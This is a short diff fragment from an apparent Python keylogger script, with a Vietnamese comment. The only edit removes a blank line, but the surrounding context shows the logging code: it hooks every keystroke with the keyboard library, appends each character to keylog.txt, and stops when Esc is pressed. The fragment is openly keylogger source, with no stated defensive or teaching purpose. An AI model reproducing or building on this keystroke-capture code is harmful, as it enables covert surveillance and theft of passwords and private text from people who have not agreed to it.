@@ -14,7 +14,6 @@ def start_keylogger():
             
             with open("keylog.txt", "a", encoding="utf-8") as log_file:
                 log_file.write(char)
-
     # Lắng nghe tất cả các phím
     keyboard.hook(log_key)
     keyboard.wait('esc')  # Dừng khi nhấn phím Esc
